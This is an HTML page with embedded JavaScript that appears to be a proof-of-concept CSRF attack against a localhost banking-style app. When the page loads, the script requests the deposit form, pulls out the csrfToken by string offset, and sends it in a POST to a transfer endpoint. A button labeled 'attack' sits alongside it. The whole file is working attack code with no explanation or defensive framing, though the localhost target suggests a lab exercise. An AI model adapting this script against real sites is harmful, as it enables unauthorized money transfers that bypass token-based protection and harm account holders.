<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="">
    <button name="attack" type="submit" id="attack">click me</button>
    </form>

   <script>     
    var req = new XMLHttpRequest();
    req.open("GET", "http://localhost/formulario-para-deposito.php", false);
    req.send(null);
    var response = req.responseText;
    //console.log(req.responseText);
    if(response.indexOf('csrfToken')>0){
        token = response.substr(response.indexOf('csrfToken')+33, 32);
        //console.log(token);
        csrfToken = token;

        ///bad request
        var params = "csrfToken="+csrfToken;
        var badreq = new XMLHttpRequest();
        badreq.open("POST", "http://localhost/transferir.php", false);
        badreq.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
        badreq.send(params);
      
        var badresponse = badreq.responseText;
        console.log(badreq.responseText);
    }else{
        console.log('No token found');
    }
   </script>
</body>
</html>